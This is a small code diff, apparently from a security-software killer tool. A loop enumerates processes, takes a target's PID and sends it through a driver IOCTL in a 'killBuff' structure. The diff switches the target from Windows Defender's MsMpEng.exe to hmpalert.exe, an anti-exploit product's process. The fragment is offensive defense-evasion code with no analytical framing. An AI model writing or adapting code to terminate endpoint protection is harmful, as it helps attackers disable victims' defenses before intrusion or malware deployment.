@@ -59,7 +59,7 @@ int main(int argc, char* argv[]) {
 	while (1) {
 		if(WINDOWS_ENGINE) {
 			
-			const wchar_t* targetProcess = L"MsMpEng.exe";
+			const wchar_t* targetProcess = L"hmpalert.exe";
 			PID = EnumerateProcess(targetProcess);
 			BOOL ioctl_result;
 			killBuff BUFFER = { PID };
